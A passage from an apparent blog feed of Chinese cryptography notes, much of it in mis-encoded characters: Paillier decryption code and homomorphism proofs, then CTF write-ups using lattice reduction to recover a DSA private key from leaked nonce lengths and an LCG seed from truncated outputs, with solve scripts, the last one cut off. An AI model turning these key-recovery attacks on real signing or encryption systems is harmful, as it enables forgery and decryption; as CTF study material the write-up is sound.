class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x<span class="number">-1</span>)/n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line">n=</span><br><span class="line"></span><br><span class="line"><span class="comment">#factor(n)</span></span><br><span class="line">a = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = nextprime(a)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ ¹æ®è§£å¯†å…¬å¼ï¼Œè®¡ç®—æ‰€éœ€ç§é’¥å¯¹ï¼ˆÎ»ï¼ŒÎ¼ï¼‰</span></span><br><span class="line">Lambda=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">miu=inverse(Lambda,n*n)</span><br><span class="line">m=(L(pow(c,Lambda,n**<span class="number">2</span>),n)*miu)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="Homomorphic-properties"><a href="#Homomorphic-properties" class="headerlink" title="Homomorphic properties"></a>Homomorphic properties</h2><h3 id="Homomorphic-addition-of-plaintexts"><a href="#Homomorphic-addition-of-plaintexts" class="headerlink" title="Homomorphic addition of plaintexts"></a>Homomorphic addition of plaintexts</h3><p>è®¾Dä¸ºè§£å¯†å‡½æ•°ï¼ŒEä¸ºåŠ å¯†å‡½æ•°</p><p>å³ï¼š$D(E(m_1, r_1)\cdot E(m_2,r_2) \pmod {n^2})â‰¡ m_1+m_2 \pmod n$</p><h4 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h4><p>$C = (g^{m_1}) \cdot (r_1^n) \cdot (g^{m_2}) \cdot (r_2^n) \pmod {n^2} $</p><p>&emsp;$= g^{m_1+m_2}\cdot (r_1\cdot r_2)^n \pmod {n^2}$</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å°†$m_1+m_2$çœ‹ä½œä¸€ä¸ªæ•´ä½“$M$ï¼Œç„¶åç”±äº$r_1ã€r_2$æ˜¯éšæœºé€‰çš„ï¼Œæ‰€ä»¥$r_1\cdot r_2$å¯ä»¥çœ‹ä½œä¸€ä¸ªæ•´ä½“$R$</p><p>æ•…$C = g^M \cdot R^n \pmod {n^2}$</p><p>ç”±äº$gcd(r_1,n) = 1; gcd(r_2,n) = 1ï¼› =&gt; gcd(r_1\cdot r_2, n) = 1$ï¼Œæ•…$R$ç¬¦åˆè¦æ±‚</p><p>æ‰€ä»¥$D(C) = M â‰¡ m_1 + m_2 \pmod n$</p><h3 id="Homomorphic-multiplication-of-plaintexts"><a href="#Homomorphic-multiplication-of-plaintexts" class="headerlink" title="Homomorphic multiplication of plaintexts"></a>Homomorphic multiplication of plaintexts</h3><p>è®¾Dä¸ºè§£å¯†å‡½æ•°ï¼ŒEä¸ºåŠ å¯†å‡½æ•°</p><p>å³ï¼š$D(E(m_1, r_1)^k \pmod {n^2})â‰¡ km_1 \pmod n$</p><h4 id="proof-1"><a href="#proof-1" class="headerlink" title="proof"></a>proof</h4><p>$C = (g^{m_1}) \cdot (r_1^n)^k\pmod {n^2} $</p><p>&emsp;$=(g^{km_1}\cdot (r_1^{kn} )\pmod {n^2}$</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å°†$km_1$çœ‹ä½œä¸€ä¸ªæ•´ä½“$M$ï¼Œç„¶åç”±äº$r_1$æ˜¯éšæœºé€‰çš„ï¼Œæ‰€ä»¥$r_1^k$å¯ä»¥çœ‹ä½œä¸€ä¸ªæ•´ä½“Rï¼Œ</p><p>æ•…$C = g^M \cdot  R^n \pmod {n^2}$</p><p>ç”±äº$gcd(r_1,n) = 1 =&gt; gcd(r_1^k, n) = 1$ï¼Œæ•…$R$ç¬¦åˆè¦æ±‚</p><p>æ‰€ä»¥$D(C) = M â‰¡ km_1 \pmod n$</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Paillier_cryptosystem</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Paillier </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paillier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ HNP</title>
      <link href="/2020/05/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BHNP/"/>
      <url>/2020/05/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BHNP/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ…å°Lattice-ä¹‹-HNP"><a href="#æµ…å°Lattice-ä¹‹-HNP" class="headerlink" title="æµ…å°Lattice ä¹‹ HNP"></a>æµ…å°Lattice ä¹‹ HNP</h1><p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/204846" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp;æ ¼å¯†ç æ˜¯ä¸€ç±»å¤‡å—å…³æ³¨çš„æŠ—é‡å­è®¡ç®—æ”»å‡»çš„å…¬é’¥å¯†ç ä½“åˆ¶ã€‚è€Œæ ¼ç†è®ºä¹Ÿä½¿è®¸å¤šç°ä»£å…¬é’¥å¯†ç RSAã€DSAç­‰ä½“ç³»å—åˆ°å½±å“ã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦ä»ä¸¤é“CTFé¢˜ç›®æ¥å­¦ä¹ æ ¼å¯†ç ä¸­çš„HNP(Hidden number problemï¼‰ã€‚</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>&emsp;&emsp;é¦–å…ˆè°ˆè°ˆä¸ªäººå¯¹Latticeçš„ç†è§£å­ã€‚ä¸ªäººè§‰å¾—ï¼ŒLatiiceå°±æ˜¯ç”±è‹¥å¹²çº¿æ€§æ— å…³çš„å‘é‡ç»„æˆçš„ä¸€ä¸ªå‘é‡ç©ºé—´ï¼Œåœ¨è¿™ä¸ªç©ºé—´ä¸­ï¼Œå‘é‡å½¼æ­¤ä¹‹é—´å¯ä»¥è¿›è¡Œç›¸åº”çš„åŠ ã€å‡è¿ç®—ã€‚å‘é‡ä¹Ÿå¯ä»¥ä¹˜ä»¥æŸä¸ªç³»æ•°ï¼Œä½†è¿™ä¸ªç³»æ•°ä»…é™äºæ•´æ•°ï¼Œå› è€Œå½¢æˆäº†å¸ƒæ»¡æ•´ä¸ªç©ºé—´çš„æ ¼ç‚¹ã€‚åœ¨æ ¼ä¸­çš„è®¡ç®—é—®é¢˜ä¸»è¦åŒ…æ‹¬ä¸¤ç§ï¼Œå³SVP(the Shortest Vector Problem of lattice)å’ŒCVP(the Closest Vector Problem)ï¼Œç„¶åä¸ªäººè®¤ä¸ºï¼ŒCVPå¯ä»¥ç»™LatiiceåŠ ä¸Šä¸€ä¸ªç»´åº¦åå˜æˆSVPï¼Œç»§è€Œå¯ä»¥ç”¨LLLç®—æ³•æ¥è¿›è¡Œè§„çº¦ä»è€Œæ‰¾åˆ°æœ€çŸ­å‘é‡ã€‚</p><h2 id="XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP"><a href="#XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP" class="headerlink" title="XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP"></a>XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP</h2><p><a href="https://mega.nz/file/efAzRabC#ZxXtUbcHwAA7jpcU0H6V7rAMRfiS_rboH9H9ZN9S2-U" target="_blank" rel="noopener">é¢˜ç›®é™„ä»¶</a></p><h3 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h3><p>é¢˜ç›®ç”¨çš„æ˜¯DSAå…¬é’¥å¯†ç ç­¾åç³»ç»Ÿã€‚</p><p>é¢˜ç›®æä¾›ç­¾åå‡½æ•°ï¼šç”¨æˆ·ä»¥ç”¨æˆ·åæ³¨å†Œï¼ŒæœåŠ¡ç«¯è¿”å›ç­¾åï¼Œ<strong>å¹¶æä¾›æ‰€ç”¨ä¸´æ—¶å¯†é’¥çš„bité•¿åº¦</strong></p><p>æˆ‘ä»¬éœ€è¦ä»¥adminçš„èº«ä»½ç™»é™†æ¥è·å–flagï¼Œä½†æ˜¯æœåŠ¡ç«¯ä¸ä¼šç»™adminç­¾å</p><h3 id="è§£é¢˜æµç¨‹"><a href="#è§£é¢˜æµç¨‹" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h3><p>æ ¹æ®é¢˜ç›®æµç¨‹ï¼Œæ˜¾ç„¶ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨ä¸´æ—¶å¯†é’¥çš„bité•¿åº¦æ¥è·å–ç§é’¥ï¼Œä»è€Œè·å¾—adminçš„ç­¾å</p><p>å…¶ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“çš„ä¿¡æ¯å…¨å±€å…¬é’¥p, q, gï¼ŒæœåŠ¡ç«¯å…¬é’¥y , æ¯è½®ç­¾åä½¿ç”¨çš„r, s, ä»¥åŠæˆ‘ä»¬å¯æ§çš„H(x)ï¼Œxå³ä¸ºç”¨æˆ·åï¼ŒHashå‡½æ•°è¿™é‡Œç”¨çš„æ˜¯sha256</p><h4 id="step1-å…¬å¼è½¬åŒ–"><a href="#step1-å…¬å¼è½¬åŒ–" class="headerlink" title="step1-å…¬å¼è½¬åŒ–"></a>step1-å…¬å¼è½¬åŒ–</h4><p>ç”±DSAç­¾åä¸­å„å‚æ•°çš„å…³ç³»</p><p>$r \equiv g^k \pmod{q}$<br>$s \equiv k^{-1}(H(m) + xr) \pmod{q}$</p><p>å¯å¾—æ¯è½®ä¸´æ—¶å¯†é’¥ä¸ç­¾åã€æ˜æ–‡çš„å…³ç³»</p><p>$k_i \equiv  s_i^{-1}r_i \cdot x + s_i^{-1}H(m) \pmod{q} $<br>$k_i \equiv A_i x + B_i \pmod{q} $<br>$k_i = A_i x + B_i + l_i q$</p><p>å…¶ä¸­$k_i$å°±æ˜¯æ¯æ¬¡ä½¿ç”¨çš„ä¸´æ—¶å¯†é’¥</p><p>åŒ–ç®€åçš„å¼å­ä¸­çš„$A_i,B_i$å‡å¯ç”±å·²çŸ¥ä¿¡æ¯è®¡ç®—</p><h4 id="step2-æ„é€ Lattice"><a href="#step2-æ„é€ Lattice" class="headerlink" title="step2-æ„é€ Lattice"></a>step2-æ„é€ Lattice</h4><p>å¯¹äºä¸Šå¼ä¸­çš„$k_i$ï¼Œæˆ‘ä»¬ä»…ä»…çŸ¥é“å®ƒçš„bit_engthï¼Œbit_engthæ³„éœ²äº†ä»€ä¹ˆä¿¡æ¯å‘¢ï¼Ÿ</p><p>å½“æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ•°çš„bit_engthæ—¶ï¼Œæˆ‘ä»¬èƒ½ç¡®å®šè¿™ä¸ªæ•°çš„å¤§å°èŒƒå›´ï¼Œ</p><p>æ¯”å¦‚ä¸€ä¸ªæ•°çš„bit_engthæ˜¯500æ—¶ï¼Œæˆ‘ä»¬èƒ½ç¡®å®šè¿™ä¸ªæ•°å¤§å°è½åœ¨$(2^{499}-1,2^{500}-1]$</p><p>æ‰€ä»¥æˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ•°çš„MSBä½ä¸º2^499</p><p>è¿™ç­‰ä»·äºï¼Œæˆ‘ä»¬çŸ¥é“äº†ä¸´æ—¶å¯†é’¥çš„ä¸€ä¸ªå¤§æ¦‚çš„å€¼ï¼Œæˆ‘ä»¬è®¾å…¶ä¸º$K$</p><p>ç„¶åæˆ‘ä»¬æ„é€ Lattice</p><p>$M =<br>\begin{bmatrix}<br>q  &amp;   &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp; q &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;      &amp; q  &amp;   &amp;   &amp; \newline<br>A_1&amp;A_2&amp;\dots &amp; A_t&amp;K/q&amp;   &amp; \newline<br>B_1&amp;B_2&amp;\dots &amp; B_t&amp;   &amp; K &amp; \newline<br>\end{bmatrix}$</p><p>ç„¶åè¿™é‡Œå°±ä¼šå­˜åœ¨ä¸€ä¸ªå‘é‡        $v =<br>\begin{bmatrix}<br>l_1 &amp; l_2 &amp; \cdots &amp; l_t &amp; x &amp; 1<br>\end{bmatrix}$</p><p>ä½¿å¾—</p><p>$vM =<br>\begin{bmatrix}<br>l_1 &amp; l_2 &amp; \cdots &amp; l_t &amp; x &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>q  &amp;   &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp; q &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;      &amp; q  &amp;   &amp;   &amp; \newline<br>A_1&amp;A_2&amp;\dots &amp; A_t&amp;K/q&amp;   &amp; \newline<br>B_1&amp;B_2&amp;\dots &amp; B_t&amp;   &amp; K &amp; \newline<br>\end{bmatrix} = \begin{bmatrix}<br>k_1 &amp;<br>k_2 &amp;<br>\cdots &amp;<br>k_t  &amp;<br>Kx/q &amp;<br>K<br>\end{bmatrix}<br>= v_k$</p><p>å…¶ä¸­å‘é‡$v$ä¸­çš„xå³ä¸ºæˆ‘ä»¬çš„ç§é’¥ï¼Œ</p><h4 id="step3-LLL"><a href="#step3-LLL" class="headerlink" title="step3-LLL"></a>step3-LLL</h4><p>è§£å†³æ ¼å¯†ç çš„é—®é¢˜LLLç®—æ³•çš„è¿ç”¨æ€»æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå¯æ˜¯è¿™é‡Œæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨LLLç®—æ³•å»æ‰¾åˆ°å‘é‡$v_k$å‘¢ï¼Ÿ</p><p>å¦‚æœæˆ‘ä»¬çš„$v_k$çš„é•¿åº¦åœ¨æ ¼ä¸­å¾ˆå°ï¼Œæˆ‘ä»¬åˆ©ç”¨LLLå°±å¾ˆå¯èƒ½å°†å…¶æ‰¾å‡ºã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸æœåŠ¡ç«¯äº¤äº’ï¼Œç„¶åæ”¶é›†å½“$k_i$çš„bit_lengthæ¯”è¾ƒå°çš„æƒ…å†µæ—¶çš„ç›¸å…³æ•°æ®ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬çŸ¥é“qçš„bit_lengthä¸º128ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ‰¾bit_legnthä¸º122çš„$k_i$ï¼Œç„¶åæˆ‘ä»¬è¿˜éœ€è¦ä¸€å®šçš„æ•°æ®é‡ï¼Œè¿™æ ·èƒ½æé«˜åˆ©ç”¨LLLç®—æ³•æ‰¾åˆ°è¿™ä¸ªçŸ­å‘é‡çš„æ¦‚ç‡ï¼Œå¹¶ä¸”ï¼Œä¸Šè¿°æ ¼ä¸­$K/q, K$çš„æ„é€ ä¹Ÿæ˜¯ä¸ºäº†è®©$v_k$ä¸­çš„æ¯ä¸€é¡¹çš„é•¿åº¦éƒ½å·®ä¸å¤šï¼Œè¿™æ ·ä¹Ÿæœ‰åˆ©äºæ‰¾åˆ°$v_k$ï¼Œå‚è€ƒè¿™ä¸€ç¯‡<a href="https://holocircuit.github.io/2019/01/08/unofficial.html" target="_blank" rel="noopener">æ–‡ç« </a>ä¸­çš„<img src="https://i.loli.net/2020/05/09/7NJvL2DSsXwHEnr.png" alt></p><p>å‚è€ƒç¥¥å“¥åšå®¢çš„è¿™ç¯‡<a href="http://blog.soreatu.com/posts/intended-solution-to-nhp-in-gxzyctf-2020/" target="_blank" rel="noopener">å‡ºé¢˜æ–‡ç« </a>ï¼Œå¦å¤–æ„Ÿè°¢ç¥¥å“¥çš„è§£æƒ‘ã€‚</p><h2 id="NPUCTF2020-babyLCG"><a href="#NPUCTF2020-babyLCG" class="headerlink" title="NPUCTF2020-babyLCG"></a>NPUCTF2020-babyLCG</h2><p>é¢˜ç›®é™„ä»¶å¯ä»¥åœ¨<a href="https://buuoj.cn/challenges#[NPUCTF2020]babyLCG" target="_blank" rel="noopener">BUUOJ</a>ä¸‹è½½</p><h3 id="é¢˜ç›®æµç¨‹"><a href="#é¢˜ç›®æµç¨‹" class="headerlink" title="é¢˜ç›®æµç¨‹"></a>é¢˜ç›®æµç¨‹</h3><ol><li>åˆå§‹åŒ–ä¸€ä¸ªLCGåŠ å¯†ç±»ï¼Œç”¨åˆ°éšæœºå‚æ•°a, b, m, seedï¼Œå…¶ä¸­a, b, mï¼Œå‡åœ¨é™„ä»¶ç»™å‡º</li><li>ç”Ÿæˆ20ä¸ª128ä½çš„éšæœºæ•°ï¼Œä½†æ˜¯åªç»™å‡ºæ¯ä¸ªæ•°çš„é«˜64ä½</li><li>å†ç”Ÿæˆä¸‰ä¸ªéšæœºæ•°ï¼Œç”¨AESåŠ å¯†åŠ å¯†flagï¼Œkeyç”±å‰ä¸¤ä¸ªéšæœºæ•°ç»„æˆï¼Œåˆ†åˆ«å–ç¬¬ä¸€ä¸ªéšæœºæ•°å’Œç¬¬äºŒä¸ªéšæœºæ•°çš„é«˜64ä½æ‹¼èµ·æ¥ï¼Œivç”±ç¬¬ä¸‰ä¸ªéšæœºæ•°ç»„æˆ</li></ol><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ä»é¢˜ç›®æµç¨‹æ¥çœ‹ï¼Œæˆ‘ä»¬ç›®çš„åªæœ‰ä¸€ä¸ªï¼Œæ¢å¤seedã€‚</p><h4 id="step1-å…¬å¼è½¬åŒ–-1"><a href="#step1-å…¬å¼è½¬åŒ–-1" class="headerlink" title="step1-å…¬å¼è½¬åŒ–"></a>step1-å…¬å¼è½¬åŒ–</h4><p>LCGç”Ÿæˆéšæœºæ•°çš„å…¬å¼ä¸ºï¼š$s_{i+1} = a*s_i+b\pmod{m}$<img src="https://i.loli.net/2020/05/09/9YZKClW4tPdzmbS.png" alt></p><p>ä½†æ˜¯è¿™ä¸€é¢˜ï¼Œæˆ‘ä»¬åªçŸ¥é“$s_1$ åˆ°$s_{20}$çš„é«˜64ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†$s_i$åˆ†ä¸ºhã€lé«˜ä½ä½ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­$h_i$å·²çŸ¥ã€‚æ‰€ä»¥æœ‰</p><p>$(h_{2}+l_{2}) \equiv a*(h_1 + l_1 )+b\pmod{m}$</p><p>$l_{2} \equiv a * l _ 1+a * h _ 1+b-h _ {2}\pmod{m}$</p><p>$l_{2} \equiv A _ 1 * l _ 1+B _ 1\pmod{m}$ ã€$è®¾A _ = a; B _ 1 = a * h _ 1+b-h _ {2}$ã€‘</p><p>$l _ {3} \equiv a * l _ {2}+a * h _ {2}+b-h _ {3}\pmod{m}$</p><p>$l _ {3} \equiv a * A_1 * l _ {1}+a * B_1+a * h_{2}+b-h _ {3}\pmod{m}$</p><p>$l _ {3} \equiv A _ {2} * l _ {1}+B _ {2}\pmod{m}$ã€$è®¾A _ {2} = a * A _ 1; B _ {2} = a * B _ 1+a * h _ {2}+b-h _ {3}$ã€‘</p><p>â€¦</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡å…¬å¼çš„å˜å½¢ï¼Œå¯ä»¥å°†åŸæ¥å¼å­$s _ {i+1} = a*s _ i + b \pmod{m}$</p><p>ä¸­$s_{i+1}å’Œs_{i}$çš„å…³ç³»è½¬å˜ä¸º$l_{i+1}å’Œl_{i}$çš„å…³ç³»ã€‚å½“ç„¶ï¼ŒåŸç³»æ•°aã€bçš„æ„ä¹‰ä¹Ÿå‘ç”Ÿäº†å¯¹åº”è½¬å˜ã€‚</p><p>è¿™é‡Œç»™å‡ºç”Ÿæˆæ–°A å’ŒB çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a=<span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m=<span class="number">226649634126248141841388712969771891297</span></span><br><span class="line"></span><br><span class="line">h = [<span class="number">0</span>,<span class="number">7800489346663478448</span>,<span class="number">11267068470666042741</span>,<span class="number">5820429484185778982</span>,<span class="number">6151953690371151688</span>,<span class="number">548598048162918265</span>,<span class="number">1586400863715808041</span>,<span class="number">7464677042285115264</span>,<span class="number">4702115170280353188</span>,<span class="number">5123967912274624410</span>,<span class="number">8517471683845309964</span>,<span class="number">2106353633794059980</span>,<span class="number">11042210261466318284</span>,<span class="number">4280340333946566776</span>,<span class="number">6859855443227901284</span>,<span class="number">3149000387344084971</span>,<span class="number">7055653494757088867</span>,<span class="number">5378774397517873605</span>,<span class="number">8265548624197463024</span>,<span class="number">2898083382910841577</span>,<span class="number">4927088585601943730</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(h)):</span><br><span class="line">h[i] &lt;&lt;= <span class="number">64</span></span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(h)<span class="number">-1</span>):</span><br><span class="line">A.append(a*A[i<span class="number">-1</span>] % m)</span><br><span class="line">B.append((a*B[i<span class="number">-1</span>]+a*h[i]+b-h[i+<span class="number">1</span>]) % m)</span><br><span class="line">print(A[<span class="number">1</span>:])</span><br><span class="line">print(B[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><h4 id="step2-æ„é€ Lattice-1"><a href="#step2-æ„é€ Lattice-1" class="headerlink" title="step2-æ„é€ Lattice"></a>step2-æ„é€ Lattice</h4><p>ç°åœ¨æˆ‘ä»¬äºŒåæ¡ä¸ $l$ ç›¸å…³çš„æ–¹ç¨‹ç»„äº†ã€‚å³</p><p>$l_{i+1} \equiv A_i*l_i+B_i\pmod{m}$</p><p>$l_{i+1} = A_i*l_i+B_i+k_im$</p><p>ä¸”å¯¹äº $l$ æˆ‘ä»¬çœŸçš„ä¸€æ— æ‰€çŸ¥ä¹ˆï¼Ÿæˆ‘ä»¬å…¶å®çŸ¥é“ $l$ æ˜¯å°äº2^64çš„ï¼Œå³ $l$ æœ€å¤§ä¸º64bitã€‚è¿™æ ·ä¸å‰é¢ä¸€é“é¢˜å°±å¾ˆç±»ä¼¼äº†ã€‚</p><p>äºæ˜¯æˆ‘ä»¬æ„é€ Lattice</p><p>$M =<br>\begin{bmatrix}<br>m  &amp;   &amp;      &amp;    &amp;   &amp;   \newline<br>&amp; m &amp;      &amp;    &amp;   &amp;   \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   \newline<br>&amp;   &amp;      &amp; m  &amp;   &amp;   \newline<br>A_1&amp;A_2&amp;\dots &amp; A_{19}&amp;1&amp;   \newline<br>B_1&amp;B_2&amp;\dots &amp; B_{19}&amp;0&amp; 2^{64}\newline<br>\end{bmatrix}$</p><p>ç„¶åè¿™é‡Œå°±ä¼šå­˜åœ¨ä¸€ä¸ªå‘é‡        $v =<br>\begin{bmatrix}<br>k_1 &amp; k_2 &amp; \cdots &amp; k_{19} &amp; l_1 &amp; 1<br>\end{bmatrix}$ ä½¿å¾—</p><p>$vM =<br>\begin{bmatrix}<br>k_1 &amp; k_2 &amp; \cdots &amp; k_{19} &amp; l_1 &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>m  &amp;   &amp;      &amp;    &amp;   &amp;   \newline<br>&amp; m &amp;      &amp;    &amp;   &amp;   \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   \newline<br>&amp;   &amp;      &amp; m  &amp;   &amp;   \newline<br>A_1&amp;A_2&amp;\dots &amp; A_{19}&amp;1&amp;   \newline<br>B_1&amp;B_2&amp;\dots &amp; B_{19}&amp;0&amp; 2^{64} \newline<br>\end{bmatrix} = \begin{bmatrix}<br>l_2 &amp;<br>l_3 &amp;<br>\cdots &amp;<br>l_{20}  &amp;<br>l_1 &amp;<br>2^{64}<br>\end{bmatrix}<br>= v_l$</p><p>å…¶ä¸­$l_1$å³ä¸º$s_1$çš„ä½ä½ï¼Œæ‹¼ä¸Šå…¶é«˜ä½ï¼Œåœ¨åˆ©ç”¨a, b, må°±èƒ½ä¼šæ¢å¤seedäº†</p><h4 id="step3-LLL-1"><a href="#step3-LLL-1" class="headerlink" title="step3-LLL"></a>step3-LLL</h4><p>&emsp;&emsp;è¿™é‡Œæˆ‘ä»¬çš„$v_l$å‘é‡æ¯ä¸€ä½éƒ½åªæœ‰çº¦64bitï¼Œæ˜¾ç„¶ï¼Œå®ƒæ˜¯æ•´ä¸ªæ ¼ä¸­æ¯”è¾ƒçŸ­çš„å‘é‡äº†ï¼Œä¸”æˆ‘ä»¬ä¸€å…±æœ‰19ç»„æ•°æ®ï¼Œé‚£ä¹ˆç›´æ¥å¯¹è¿™ä¸ªLattice Mè¿ç”¨LLLç®—æ³•å°±å¯ä»¥æ‰¾åˆ°$v_l$äº†ã€‚ï¼ˆæ ¼ä¸­å‚æ•°$2^{64}$çš„é€‰å–é“ç†ä¸ä¸Šé¢ä¸€è‡´ï¼‰</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#sage</span></span><br><span class="line"><span class="string">b=153582801876235638173762045261195852087</span></span><br><span class="line"><span class="string">a=107763262682494809191803026213015101802</span></span><br><span class="line"><span class="string">m=226649634126248141841388712969771891297</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h = [0,7800489346663478448,11267068470666042741,5820429484185778982,6151953690371151688,548598048162918265,1586400863715808041,7464677042285115264,4702115170280353188,5123967912274624410,8517471683845309964,2106353633794059980,11042210261466318284,4280340333946566776,6859855443227901284,3149000387344084971,7055653494757088867,5378774397517873605,8265548624197463024,2898083382910841577,4927088585601943730]</span></span><br><span class="line"><span class="string">for i in range(len(h)):</span></span><br><span 